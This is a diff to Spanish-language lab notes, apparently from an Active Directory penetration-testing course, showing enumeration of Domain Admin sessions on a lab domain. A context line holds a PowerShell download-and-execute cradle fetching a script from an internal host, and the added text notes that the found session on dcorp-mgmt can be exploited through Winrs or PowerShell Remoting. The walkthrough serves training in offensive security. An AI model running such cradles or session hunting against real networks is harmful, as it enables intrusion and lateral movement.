@@ -426,3 +426,17 @@ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Power
 [dcorp-ci]
 Find-DomainUserLocation
 ```
+
+```ad-hint
+UserDomain      : dcorp
+UserName        : svcadmin
+ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
+IPAddress       : 172.16.4.44
+SessionFrom     :
+SessionFromName :
+LocalAdmin      :
+```
+
+Obteniedo como resultado las maquinas que tienen una sesion de Domain Admin en ellas en este caso encontramos *dcorp-mgmt*
+Ahora podemos aprovechar esto usando *Winrs* o *PowerShell Remoting*
+
